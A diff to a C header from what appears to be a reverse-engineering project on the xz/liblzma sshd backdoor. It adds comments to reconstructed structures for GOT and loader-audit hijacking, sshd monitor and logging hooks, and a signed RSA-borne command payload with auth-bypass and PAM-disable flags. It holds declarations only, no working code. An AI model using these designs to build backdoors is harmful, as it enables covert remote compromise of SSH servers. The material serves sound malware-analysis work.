@@ -1,36 +1,69 @@
 typedef long ptrdiff_t;
+
 typedef unsigned long size_t;
+
 typedef long ssize_t;
+
 typedef unsigned long uintptr_t;
+
 typedef long intptr_t;
+
 typedef signed char int8_t;
+
 typedef unsigned char uint8_t;
+
 typedef short int16_t;
+
 typedef unsigned short uint16_t;
+
 typedef int int32_t;
+
 typedef unsigned int uint32_t;
+
 typedef long long int64_t;
+
 typedef unsigned long long uint64_t;
+
 void hexdump(void *pAddressIn, long lSize);
+
 typedef uint8_t u8;
+
 typedef uint16_t u16;
+
 typedef uint32_t u32;
+
 typedef uint64_t u64;
+
 typedef uintptr_t uptr;
+
 typedef unsigned int pid_t;
+
 typedef unsigned int uid_t;
+
 typedef unsigned int gid_t;
+
 typedef unsigned int mode_t;
+
 typedef uint16_t Elf64_Half;
+
 typedef uint32_t Elf64_Word;
+
 typedef int32_t Elf64_Sword;
+
 typedef uint64_t Elf64_Xword;
+
 typedef int64_t Elf64_Sxword;
+
 typedef uint32_t Elf32_Addr;
+
 typedef uint64_t Elf64_Addr;
+
 typedef uint64_t Elf64_Off;
+
 typedef uint16_t Elf64_Section;
+
 typedef Elf64_Xword Elf64_Relr;
+
 typedef struct
 {
   unsigned char e_ident[(16)];
@@ -48,6 +81,7 @@ typedef struct
   Elf64_Half e_shnum;
   Elf64_Half e_shstrndx;
 } Elf64_Ehdr;
+
 typedef struct
 {
   Elf64_Word p_type;
@@ -59,6 +93,7 @@ typedef struct
   Elf64_Xword p_memsz;
   Elf64_Xword p_align;
 } Elf64_Phdr;
+
 typedef struct
 {
   Elf64_Sxword d_tag;
@@ -68,6 +103,7 @@ typedef struct
       Elf64_Addr d_ptr;
     } d_un;
 } Elf64_Dyn;
+
 typedef struct
 {
   Elf64_Word st_name;
@@ -77,48 +113,74 @@ typedef struct
   Elf64_Addr st_value;
   Elf64_Xword st_size;
 } Elf64_Sym;
+
 typedef struct
 {
   Elf64_Addr r_offset;
   Elf64_Xword r_info;
   Elf64_Sxword r_addend;
 } Elf64_Rela;
+
 typedef uptr
  Elf32_Sym, Elf64_Relr,
  Elf64_Verdef, Elf64_Versym, sigset_t, fd_set;
+
 typedef struct evp_pkey_st EVP_PKEY;
+
 typedef struct rsa_st RSA;
+
 typedef struct dsa_st DSA;
+
 typedef struct bignum_st BIGNUM;
+
 typedef struct ec_point_st EC_POINT;
+
 typedef struct ec_key_st EC_KEY;
+
 typedef struct ec_group_st EC_GROUP;
+
 typedef struct evp_md_st EVP_MD;
+
 typedef struct evp_cipher_st EVP_CIPHER;
+
 typedef struct evp_cipher_ctx_st EVP_CIPHER_CTX;
+
 typedef struct engine_st ENGINE;
+
 typedef struct evp_md_ctx_st EVP_MD_CTX;
+
 typedef struct evp_pkey_ctx_st EVP_PKEY_CTX;
+
 typedef struct bignum_ctx BN_CTX;
+
 typedef unsigned int point_conversion_form_t;
+
 typedef struct {
  void *(*alloc)(void *opaque, size_t nmemb, size_t size);
  void (*free)(void *opaque, void *ptr);
  void *opaque;
 } lzma_allocator;
+
 typedef long int Lmid_t;
+
+/*
+ * Subset of liblzma integrity-check identifiers the implant cares about when faking encoder state so we only accept payloads signed with CRC32/CRC64/SHA256.
+ */
 typedef enum {
  LZMA_CHECK_NONE = 0,
  LZMA_CHECK_CRC32 = 1,
  LZMA_CHECK_CRC64 = 4,
  LZMA_CHECK_SHA256 = 10
 } lzma_check;
+
 struct auditstate
 {
    uintptr_t cookie;
    unsigned int bindflags;
 };
+
 typedef struct link_map *lookup_t;
+
 typedef struct gnu_hash_table {
  uint32_t nbuckets;
  uint32_t symoffset;
@@ -126,12 +188,19 @@ typedef struct gnu_hash_table {
  uint32_t bloom_shift;
  uint64_t bloom[];
 } gnu_hash_table_t;
+
 struct La_i86_regs;
+
 struct La_i86_retval;
+
 struct La_x86_64_regs;
+
 struct La_x86_64_retval;
+
 struct La_x32_regs;
+
 struct La_x32_retval;
+
 struct audit_ifaces
 {
  void (*activity) (uintptr_t *, unsigned int);
@@ -181,10 +250,12 @@ struct audit_ifaces
  unsigned int (*objclose) (uintptr_t *);
  struct audit_ifaces *next;
 };
+
 typedef struct {
  uint32_t state[8];
  uint64_t size;
 } lzma_sha256_state;
+
 typedef struct {
  uint8_t buffer[64];
  union {
@@ -193,6 +264,10 @@ typedef struct {
   lzma_sha256_state sha256;
  } state;
 } lzma_check_state;
+
+/*
+ * Literal opcode values consumed by the lightweight disassembler so pattern-matching routines can locate MOV/LEA/CALL sequences without pulling in a full decoder.
+ */
 enum X86_OPCODE {
  X86_OPCODE_LEA = 0x8D,
  X86_OPCODE_CALL = 0xE8,
@@ -201,10 +276,19 @@ enum X86_OPCODE {
  X86_OPCODE_MOV_LOAD = 0x8B,
  X86_OPCODE_MOV_STORE = 0x8C
 };
+
+/*
+ * Normalized register identifiers that the decoder uses when it needs to refer to architectural registers (only RBP is currently required).
+ */
 enum X86_REG {
  X86_REG_RBP = 5
 };
+
 typedef int BOOL;
+
+/*
+ * Bitmask describing which optional instruction prefixes (LOCK/REP, segment overrides, operand/address-size hints, VEX, REX and ModRM) were observed while decoding an x86 instruction.
+ */
 typedef enum {
  DF1_LOCK_REP = 1,
  DF1_SEG = 2,
@@ -215,6 +299,10 @@ typedef enum {
  DF1_MODRM = 0x40,
  DF1_SIB = 0x80
 } InstructionFlags;
+
+/*
+ * Secondary flag set emitted by the decoder that captures which addressing features (displacement, immediates, 64-bit immediates) are present for the current instruction.
+ */
 typedef enum {
  DF2_MEM_DISP = 0x1,
  DF2_MEM_DISP8 = 0x2,
@@ -223,6 +311,10 @@ typedef enum {
  DF2_IMM = 0x8,
  DF2_IMM64 = 0x10
 } InstructionFlags2;
+
+/*
+ * Bitmask describing which relocation tables, version records, and hardening features were discovered while parsing an ELF image.
+ */
 typedef enum {
  X_ELF_PLTREL = 0x1,
  X_ELF_RELA = 0x2,
@@ -231,22 +323,38 @@ typedef enum {
  X_ELF_VERSYM = 0x10,
  X_ELF_NOW = 0x20
 } ElfFlags;
+
+/*
+ * Categorization of the ModRM byte modes that the instruction search helpers check when scanning for register or displacement based operands.
+ */
 typedef enum {
  MRM_I_REG,
  MRM_I_DISP1,
  MRM_I_DISP4,
  MRM_D_REG
 } ModRm_Mod;
+
+/*
+ * High-level opcode families the scanner can search for; currently only used to distinguish ENDBR64 sequences from padding NOPs.
+ */
 typedef enum {
  FIND_ENDBR64,
  FIND_NOP
 } FuncFindType;
+
+/*
+ * Stable identifiers for each ELF image we track (main executable, ld.so, libc, liblzma, libcrypto) so helpers can index into shared arrays without raw pointers.
+ */
 typedef enum {
  X_ELF_MAIN = 0,
  X_ELF_DYNAMIC_LINKER = 1,
  X_ELF_LIBC = 2,
  X_ELF_LIBCRYPTO = 3
 } ElfId;
+
+/*
+ * Enumerated handles for the small set of sshd status strings we care about when locating code and data references inside the binary.
+ */
 typedef enum {
  XREF_xcalloc_zero_size = 0,
  XREF_Could_not_chdir_to_home_directory_s_s = 1,
@@ -276,6 +384,10 @@ typedef enum {
  XREF_48s_48s_d_pid_ld_ = 25,
  XREF_Unrecognized_internal_syslog_level_code_d = 26
 } StringXrefId;
+
+/*
+ * Indexes into the deduplicated string table embedded in xzre’s rodata dump; the values double as offsets into the `string_mask_data` array.
+ */
 typedef enum {
  STR_from = 0x810,
  STR_ssh2 = 0x678,
@@ -394,9 +506,14 @@ typedef enum {
  STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj = 0xb00,
  STR_ELF = 0x300,
 } EncodedStringId;
+
+/*
+ * State machine for the payload download/decrypt workflow (only INITIAL is defined so far while the rest of the states are discovered dynamically).
+ */
 typedef enum {
  PAYLOAD_STATE_INITIAL = -1
 } PayloadState;
+
 struct sshbuf {
  u8 *d;
  const u8 *cd;
@@ -408,8 +525,9 @@ struct sshbuf {
  u32 refcount;
  struct sshbuf *parent;
 };
-;
+
 struct kex;
+
 struct monitor {
  int m_recvfd;
  int m_sendfd;
@@ -418,12 +536,14 @@ struct monitor {
  struct kex **m_pkex;
  pid_t m_pid;
 };
+
 struct sensitive_data {
  struct sshkey **host_keys;
  struct sshkey **host_pubkeys;
  struct sshkey **host_certificates;
  int have_ssh2_key;
 };
+
 struct sshkey {
  int type;
  int flags;
@@ -448,31 +568,42 @@ struct sshkey {
  u8 *shield_prekey;
  size_t shield_prekey_len;
 };
+
+/*
+ * Tracks the GOT slot that is currently being patched while hijacking liblzma’s resolver.
+ * Holds the slot pointer itself, the original return site, the cpuid trampoline, and the signed displacement so we can roll back or advance the hook safely.
+ */
 typedef struct __attribute__((packed)) got_ctx {
  void *got_ptr;
  void *return_address;
  void *cpuid_fn;
  ptrdiff_t got_offset;
 } got_ctx_t;
-;
-;
-;
-;
-;
+
+/*
+ * Lightweight record describing the symbol import we are about to tamper with.
+ * Bundles the loader-provided symbol pointer, the `got_ctx_t` used for the patch, and the caller’s stack frame for later restoration.
+ */
 typedef struct __attribute__((packed)) elf_entry_ctx {
  void *symbol_ptr;
  got_ctx_t got_ctx;
  u64 *frame_address;
 } elf_entry_ctx_t;
-;
-;
-;
+
+/*
+ * Convenience masks for projecting a decoded ModRM byte into its RM/REG/MOD fields or for retrieving the raw byte from the bit-packed representation.
+ */
 enum dasm_modrm_mask {
  XZ_MODRM_RM = 0xFF000000,
  XZ_MODRM_REG = 0x00FF0000,
  XZ_MODRM_MOD = 0x0000FF00,
  XZ_MODRM_RAW = 0x000000FF
 };
+
+/*
+ * Hand-written x86 decoder used throughout the project to find instructions without shipping a full disassembler.
+ * It records prefix bits, VEX/REX state, ModRM/SIB breakdowns, computed operands, and scratch fields so pattern searchers can share one structure.
+ */
 typedef struct __attribute__((packed)) dasm_ctx {
  u8* instruction;
  u64 instruction_size;
@@ -532,34 +663,10 @@ typedef struct __attribute__((packed)) dasm_ctx {
  u8 insn_offset;
  u8 _unknown819[7];
 } dasm_ctx_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Parsed view of an ELF image that exposes the headers, relocation tables, version info, code/data segments, and GNU hash metadata needed by the import fix-ups.
+ */
 typedef struct __attribute__((packed)) elf_info {
  Elf64_Ehdr *elfbase;
  u64 first_vaddr;
@@ -600,41 +707,10 @@ typedef struct __attribute__((packed)) elf_info {
  u32 *gnu_hash_buckets;
  u32 *gnu_hash_chain;
 } elf_info_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Resolved libc entrypoints used by the implant (pselect/read/write/setresgid/etc.) along with the book-keeping counters for how many symbols were patched successfully.
+ */
 typedef struct __attribute__((packed)) libc_imports {
  u32 resolved_imports_count;
  u8 _unknown993[4];
@@ -655,28 +731,20 @@ typedef struct __attribute__((packed)) libc_imports {
  int (*shutdown)(int sockfd, int how);
  void *__libc_stack_end;
 } libc_imports_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
 typedef int (*pfn_RSA_public_decrypt_t)(
  int flen, unsigned char *from, unsigned char *to,
  RSA *rsa, int padding);
+
 typedef int (*pfn_EVP_PKEY_set1_RSA_t)(EVP_PKEY *pkey, struct rsa_st *key);
+
 typedef void (*pfn_RSA_get0_key_t)(
  const RSA *r,
  const BIGNUM **n, const BIGNUM **e, const BIGNUM **d);
+
+/*
+ * All non-libc function pointers the payload needs (RSA/EVP/BN helpers, chacha decrypt, etc.) plus access to the owning `libc_imports_t` so callers can reach both sets via one pointer.
+ */
 typedef struct __attribute__((packed)) imported_funcs {
  pfn_RSA_public_decrypt_t RSA_public_decrypt;
  pfn_EVP_PKEY_set1_RSA_t EVP_PKEY_set1_RSA;
@@ -739,47 +807,16 @@ typedef struct __attribute__((packed)) imported_funcs {
  u32 resolved_imports_count;
  u8 _unknown1109[4];
 } imported_funcs_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
 struct ssh;
+
 struct sshbuf;
+
 typedef int (*sshd_monitor_func_t)(struct ssh *ssh, int sock, struct sshbuf *m);
+
+/*
+ * Snapshot of the sshd monitor state that tracks where each `mm_answer_*` handler lives, whether it has already been hooked, and which request IDs correspond to the sensitive operations we intercept.
+ */
 typedef struct __attribute__((packed)) sshd_ctx {
  BOOL have_mm_answer_keyallowed;
  BOOL have_mm_answer_authpassword;
@@ -817,32 +854,10 @@ typedef struct __attribute__((packed)) sshd_ctx {
  char *STR_without_password;
  char *STR_publickey;
 } sshd_ctx_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Mirror of sshd’s syslog verbosity levels so the hook can translate its own severity decisions into whatever the daemon expects.
+ */
 typedef enum {
  SYSLOG_LEVEL_QUIET,
  SYSLOG_LEVEL_FATAL,
@@ -854,11 +869,16 @@ typedef enum {
  SYSLOG_LEVEL_DEBUG3,
  SYSLOG_LEVEL_NOT_SET = -1
 } LogLevel;
+
 typedef void (*log_handler_fn)(
  LogLevel level,
  int forced,
  const char *msg,
  void *ctx);
+
+/*
+ * Captures the moving pieces required to hook sshd’s logging path, including the original handler, replacement trampolines, format strings, and guard booleans to keep syslog stable.
+ */
 typedef struct __attribute__((packed)) sshd_log_ctx {
  BOOL logging_disabled;
  BOOL log_hooking_possible;
@@ -876,22 +896,10 @@ typedef struct __attribute__((packed)) sshd_log_ctx {
  void *sshlogv;
  void (*mm_log_handler)(int level, int forced, const char *msg, void *ctx);
 } sshd_log_ctx_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Compressed description of where the interesting fields live inside `struct kex` (qword index plus byte offset) so we can adjust to layout shifts between builds.
+ */
 typedef union __attribute__((packed)) sshd_offsets_kex {
  struct __attribute__((packed)) {
   u8 kex_qword_index;
@@ -899,6 +907,10 @@ typedef union __attribute__((packed)) sshd_offsets_kex {
  };
  u16 value;
 } sshd_offsets_kex_t;
+
+/*
+ * Same idea as `sshd_offsets_kex_t` but for the sshbuf backing storage; stores the indices of the data pointer and size field we need to rewrite.
+ */
 typedef union __attribute__((packed)) sshd_offsets_sshbuf {
  struct __attribute__((packed)) {
   u8 sshbuf_data_qword_index;
@@ -906,10 +918,18 @@ typedef union __attribute__((packed)) sshd_offsets_sshbuf {
  };
  u16 value;
 } sshd_offsets_sshbuf_t;
+
+/*
+ * Convenience wrapper that groups the individual offset unions for simultaneous propagation from the scanning routines into the runtime context.
+ */
 typedef struct __attribute__((packed)) sshd_offsets_fields {
  sshd_offsets_kex_t kex;
  sshd_offsets_sshbuf_t sshbuf;
 } sshd_offsets_fields_t;
+
+/*
+ * 32-bit union that packs the discovered offsets and exposes them both as structured fields and as a raw integer when we need atomic updates.
+ */
 typedef struct __attribute__((packed)) sshd_offsets {
  union {
   struct {
@@ -921,8 +941,17 @@ typedef struct __attribute__((packed)) sshd_offsets {
   u32 raw_value;
  };
 } sshd_offsets_t;
+
+/*
+ * Reserved pointer that will eventually hold sshd-specific payload book-keeping; today it is only used as a typed placeholder hanging off `global_context_t`.
+ */
 typedef struct __attribute__((packed)) sshd_payload_ctx {
 } sshd_payload_ctx_t;
+
+/*
+ * Authoritative runtime state for the backdoor.
+ * It wires together imported function tables, sshd metadata, decrypted payload buffers, socket scratch space, and secret shift operations so every hook can reach consistent data.
+ */
 typedef struct __attribute__((packed)) global_context {
  BOOL uses_endbr64;
  u8 _unknown1314[4];
@@ -960,46 +989,19 @@ typedef struct __attribute__((packed)) global_context {
  u32 num_shifted_bits;
  u8 _unknown1409[4];
 } global_context_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Tiny structure that stage-one drops into `.bss` so later stages can find the `global_context_t`, the active hooks, and the exported helper thunks without re-scanning memory.
+ */
 typedef struct __attribute__((packed)) backdoor_shared_globals {
  sshd_monitor_func_t mm_answer_authpassword_hook;
  pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
  global_context_t **globals;
 } backdoor_shared_globals_t;
-;
-;
-;
-;
+
+/*
+ * All of the state we steal from the dynamic loader when we patch the audit interfaces: pointers to `_dl_audit_symbind_alt`, link-map fields, cached audit bitmasks, and copies of the hooked GOT entries.
+ */
 typedef struct __attribute__((packed)) ldso_ctx {
  u8 _unknown1459[0x40];
  u32 *libcrypto_auditstate_bindflags_ptr;
@@ -1024,25 +1026,10 @@ typedef struct __attribute__((packed)) ldso_ctx {
  imported_funcs_t *imported_funcs;
  u64 hooks_installed;
 } ldso_ctx_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Blob that actually lives inside liblzma’s data segment and holds the loader context (`ldso_ctx_t`), `global_context_t`, resolved imports, sshd/log contexts, and the signed payload bytes the implant enforces.
+ */
 typedef struct __attribute__((packed)) backdoor_hooks_data {
  ldso_ctx_t ldso_ctx;
  global_context_t global_ctx;
@@ -1053,15 +1040,10 @@ typedef struct __attribute__((packed)) backdoor_hooks_data {
  u64 signed_data_size;
  u8 signed_data;
 } backdoor_hooks_data_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Ephemeral orchestrator that stage-one uses while replaying the GOT patches; exposes pointers to the shared globals, the loader callbacks, and the mm_* hooks we ultimately install.
+ */
 typedef struct __attribute__((packed)) backdoor_hooks_ctx {
  u8 _unknown1621[0x30];
  backdoor_shared_globals_t *shared;
@@ -1079,15 +1061,10 @@ typedef struct __attribute__((packed)) backdoor_hooks_ctx {
  sshd_monitor_func_t mm_answer_keyverify;
  u8 _unknown1635[sizeof(void *)];
 } backdoor_hooks_ctx_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Argument bundle handed to `backdoor_setup` so the second stage has references to the shared globals, hook descriptors, dummy lzma state, and the entry context it should continue from.
+ */
 typedef struct __attribute__((packed)) backdoor_setup_params {
  u8 _unknown1649[0x8];
  backdoor_shared_globals_t *shared;
@@ -1095,10 +1072,10 @@ typedef struct __attribute__((packed)) backdoor_setup_params {
  lzma_check_state dummy_check_state;
  elf_entry_ctx_t *entry_ctx;
 } backdoor_setup_params_t;
-;
-;
-;
-;
+
+/*
+ * Pointers to each parsed ELF info block (main binary, ld.so, libc, liblzma, libcrypto) so helper routines can iterate the fleet without repeating lookups.
+ */
 typedef struct __attribute__((packed)) elf_handles {
  elf_info_t *main;
  elf_info_t *dynamic_linker;
@@ -1106,28 +1083,32 @@ typedef struct __attribute__((packed)) elf_handles {
  elf_info_t *liblzma;
  elf_info_t *libcrypto;
 } elf_handles_t;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Lightweight bootstrap record containing the `elf_handles_t`, ld.so’s header, and a pointer to `__libc_stack_end`; used while pivoting into the loader context.
+ */
 typedef struct __attribute__((packed)) main_elf {
  elf_handles_t *elf_handles;
  Elf64_Ehdr *dynamic_linker_ehdr;
  void **__libc_stack_end;
 } main_elf_t;
-;
-;
-;
-;
+
+/*
+ * Master structure built during the loader pass that holds every `link_map`, the parsed `elf_info_t` objects for key libraries, resolved libc imports, string references, and the fake allocator we expose to liblzma.
+ */
 typedef struct backdoor_data backdoor_data_t;
+
+/*
+ * Pairs the monolithic `backdoor_data_t` blob with its `elf_handles_t` so loader helpers can take one argument yet still access both structures.
+ */
 typedef struct __attribute__((packed)) backdoor_data_handle {
  backdoor_data_t *data;
  elf_handles_t *elf_handles;
 } backdoor_data_handle_t;
-;
-;
+
+/*
+ * Single entry in the string-reference table that records which encoded string we matched along with the function bounds and the exact xref address.
+ */
 typedef struct __attribute__((packed)) string_item {
  EncodedStringId string_id;
  u8 _unknown1718[4];
@@ -1135,16 +1116,17 @@ typedef struct __attribute__((packed)) string_item {
  void *func_end;
  void *xref;
 } string_item_t;
-;
-;
-;
-;
-;
+
+/*
+ * Fixed-size array of `string_item_t` records covering the 27 status strings we track inside sshd to anchor later scans.
+ */
 typedef struct __attribute__((packed)) string_references {
  string_item_t entries[27];
 } string_references_t;
-;
-;
+
+/*
+ * Master structure built during the loader pass that holds every `link_map`, the parsed `elf_info_t` objects for key libraries, resolved libc imports, string references, and the fake allocator we expose to liblzma.
+ */
 typedef struct __attribute__((packed)) backdoor_data {
  struct link_map *main_map;
  struct link_map *dynamic_linker_map;
@@ -1164,24 +1146,10 @@ typedef struct __attribute__((packed)) backdoor_data {
  lzma_allocator fake_allocator;
  lzma_allocator *import_resolver;
 } backdoor_data_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Scratch arguments passed around while iterating dependent libraries; stitches together the master data blob, elf handles, resolved PLT stubs, and pointers back to the hook data so each pass can install the necessary trampolines.
+ */
 typedef struct __attribute__((packed)) backdoor_shared_libraries_data {
  backdoor_data_t *data;
  elf_handles_t *elf_handles;
@@ -1191,13 +1159,10 @@ typedef struct __attribute__((packed)) backdoor_shared_libraries_data {
  backdoor_hooks_data_t **hooks_data_addr;
  libc_imports_t *libc_imports;
 } backdoor_shared_libraries_data_t;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Bit-packed cursor (3-bit bit index + 29-bit byte index) used when reconstructing the obfuscated secret data stream stored inside the RSA payload.
+ */
 typedef union {
  u32 index;
  struct {
@@ -1205,6 +1170,10 @@ typedef union {
   u32 byte_index : 29;
  };
 } secret_data_shift_cursor_t;
+
+/*
+ * One decoded chunk of the secret data stream including the original code reference, the shift cursor, the operation index, and bookkeeping counters.
+ */
 typedef struct __attribute__((packed)) secret_data_item {
  u8 *code;
  secret_data_shift_cursor_t shift_cursor;
@@ -1212,12 +1181,10 @@ typedef struct __attribute__((packed)) secret_data_item {
  u32 shift_count;
  u32 index;
 } secret_data_item_t;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Header laid over the RSA modulus bytes; fields A/B/C encode the command family and payload lengths before we decrypt the body.
+ */
 typedef struct __attribute__((packed)) key_payload_hdr {
  union {
   u8 bytes[16];
@@ -1228,23 +1195,37 @@ typedef struct __attribute__((packed)) key_payload_hdr {
   };
  };
 } backdoor_payload_hdr_t;
-;
+
+/*
+ * Two-byte overlay that lets us treat the final argument byte pair as either raw data or as a little-endian size value when computing payload lengths.
+ */
 typedef union __attribute__((packed)) {
  u8 value[2];
  u16 size;
 } u_cmd_arguments_t;
+
+/*
+ * Command flags (three flag bytes plus the variable-size union) that describe how the monitor thread should interpret the decrypted payload.
+ */
 typedef struct __attribute__((packed)) cmd_arguments {
  u8 flags1;
  u8 flags2;
  u8 flags3;
  u_cmd_arguments_t u;
 } cmd_arguments_t;
+
+/*
+ * Decrypted payload layout containing the Ed448 signature, parsed command arguments, and the opaque body that holds monitor instructions.
+ */
 typedef struct __attribute__((packed)) key_payload_body {
  u8 signature[114];
  cmd_arguments_t args;
  u8 data[0x1A1];
 } backdoor_payload_body_t;
-;
+
+/*
+ * Wrapper around the payload header/body union so helpers can address the entire 0x228-byte buffer or reason about header/body separately.
+ */
 typedef struct __attribute__((packed)) backdoor_payload {
  union {
   u8 data[0x228];
@@ -1254,9 +1235,10 @@ typedef struct __attribute__((packed)) backdoor_payload {
   };
  };
 } backdoor_payload_t;
-;
-;
-;
+
+/*
+ * Variable-length framing used while streaming RSA payload chunks; repeats the header, length field, and byte array to support incremental decrypts.
+ */
 typedef struct __attribute__((packed)) key_payload {
  union {
   u8 data[0];
@@ -1267,9 +1249,10 @@ typedef struct __attribute__((packed)) key_payload {
   };
  };
 } key_payload_t;
-;
-;
-;
+
+/*
+ * Interpretation of the first byte of the `cmd_arguments_t` block (packet sizing hints, PAM disablement, socket index encoding, etc.).
+ */
 enum CommandFlags1 {
  X_FLAGS1_8BYTES = 0x1,
  X_FLAGS1_SETLOGMASK = 0x4,
@@ -1277,6 +1260,10 @@ enum CommandFlags1 {
  X_FLAGS1_DISABLE_PAM = 0x40,
  X_FLAGS1_NO_EXTENDED_SIZE = 0x80
 };
+
+/*
+ * Second command flag byte which governs impersonation behaviour, monitor request overrides, auth bypass toggles, and which socket descriptor is referenced.
+ */
 enum CommandFlags2 {
  X_FLAGS2_IMPERSONATE = 0x1,
  X_FLAGS2_CHANGE_MONITOR_REQ = 0x2,
@@ -1285,15 +1272,18 @@ enum CommandFlags2 {
  X_FLAGS2_PSELECT = 0xC0,
  X_FLAGS2_SOCKFD_MASK = 0x78
 };
+
+/*
+ * Final command flag byte indicating the numeric socket identifier plus monitor request value derived from the payload.
+ */
 enum CommandFlags3 {
  X_FLAGS3_SOCKET_NUM = 0x1F,
  X_FLAGS3_MONITOR_REQ_VAL = 0x3F
 };
-;
-;
-;
-;
-;
+
+/*
+ * Working context for RSA-related operations; caches the modulus/exponent pointers, parsed command flags, decrypted payload, IV, and Ed448 key material extracted from the host key.
+ */
 typedef struct __attribute__((packed)) key_ctx {
  const BIGNUM *rsa_n;
  const BIGNUM *rsa_e;
@@ -1304,12 +1294,10 @@ typedef struct __attribute__((packed)) key_ctx {
  u8 ed448_key[57];
  u8 _unknown2043[2];
 } key_ctx_t;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Structure passed into the monitor thread once a payload is decrypted; exposes the decoded command, RSA key pointers, payload body pointer/size, and the sshd RSA handle.
+ */
 typedef struct __attribute__((packed)) monitor_data {
  u32 cmd_type;
  u8 _unknown2059[4];
@@ -1321,17 +1309,18 @@ typedef struct __attribute__((packed)) monitor_data {
  u8 _unknown2065[6];
  RSA *rsa;
 } monitor_data_t;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Union that either exposes the fully-populated `monitor_data_t` or lets the caller treat the same memory as a flat 608-byte scratch buffer during staging.
+ */
 typedef union __attribute__((packed)) backdoor_runtime_data {
  monitor_data_t monitor;
  u8 data[608];
 } backdoor_runtime_data_t;
+
+/*
+ * Large bookkeeping record backing `run_backdoor_commands`; maintains payload sizing, hostkey metadata, socket input buffers, per-command runtime state, and the embedded `key_ctx_t` used across iterations.
+ */
 typedef struct __attribute__((packed)) run_backdoor_commands_data {
  u64 body_size;
  BOOL *p_do_orig;
@@ -1362,37 +1351,27 @@ typedef struct __attribute__((packed)) run_backdoor_commands_data {
  backdoor_runtime_data_t data;
  key_ctx_t kctx;
 } run_backdoor_commands_data_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
+/*
+ * Constant offsets harvested from liblzma that describe where the cpuid GOT slot and stage-two trampoline live so the hook can update them without rescanning instructions.
+ */
 typedef struct __attribute__((packed)) backdoor_cpuid_reloc_consts {
  ptrdiff_t cpuid_random_symbol_got_offset;
  u64 cpuid_got_index;
  ptrdiff_t backdoor_init_stage2_got_offset;
 } backdoor_cpuid_reloc_consts_t;
-;
-;
-;
-;
+
+/*
+ * Similar relocation constants for the `__tls_get_addr` thunk so we can locate the PLT stub and randomized GOT slot at runtime.
+ */
 typedef struct __attribute__((packed)) backdoor_tls_get_addr_reloc_consts {
  ptrdiff_t tls_get_addr_plt_offset;
  ptrdiff_t tls_get_addr_random_symbol_got_offset;
 } backdoor_tls_get_addr_reloc_consts_t;
-;
-;
-;
+
+/*
+ * Mini vtable exported back into liblzma that holds callable helpers (initializing hook structs, parsing an ELF header, resolving symbols) so the stage-two code can reuse our C helpers.
+ */
 typedef struct __attribute__((packed)) elf_functions {
  u8 _unknown2188[sizeof(u64)];
  int (*init_hook_functions)(backdoor_hooks_ctx_t *funcs);
@@ -1402,18 +1381,18 @@ typedef struct __attribute__((packed)) elf_functions {
  u8 _unknown2203[sizeof(u64)];
  BOOL (*elf_parse)(Elf64_Ehdr *ehdr, elf_info_t *elf_info);
 } elf_functions_t;
-;
-;
-;
-;
+
+/*
+ * Dummy `lzma_allocator` instance that mimics the original callback table; used when the implant needs to satisfy allocation requests without delegating to libc.
+ */
 typedef struct __attribute__((packed)) fake_lzma_allocator {
  u8 _unknown2218[sizeof(u64)];
  lzma_allocator allocator;
 } fake_lzma_allocator_t;
-;
-;
-;
-;
+
+/*
+ * Shared context for the instruction-search helpers; tracks the scan range, the byte pattern we expect, the output register captures, and provides access to hook/import state during complex searches.
+ */
 typedef struct __attribute__((packed)) instruction_search_ctx
 {
  u8 *start_addr;
@@ -1426,37 +1405,36 @@ typedef struct __attribute__((packed)) instruction_search_ctx
  backdoor_hooks_data_t *hooks;
  imported_funcs_t *imported_funcs;
 } instruction_search_ctx_t;
-;
-;
-;
-;
-;
-;
-;
-;
-;
+
 extern BOOL sshd_proxy_elevate(monitor_data_t *args, global_context_t *ctx);
+
 extern BOOL x86_dasm(dasm_ctx_t *ctx, u8 *code_start, u8 *code_end);
+
 extern BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx);
+
 extern BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement);
+
 extern BOOL find_instruction_with_mem_operand(
  u8 *code_start,
  u8 *code_end,
  dasm_ctx_t *dctx,
  void *mem_address
 );
+
 extern BOOL find_lea_instruction_with_mem_operand(
  u8 *code_start,
  u8 *code_end,
  dasm_ctx_t *dctx,
  void *mem_address
 );
+
 extern BOOL find_add_instruction_with_mem_operand(
  u8 *code_start,
  u8 *code_end,
  dasm_ctx_t *dctx,
  void *mem_address
 );
+
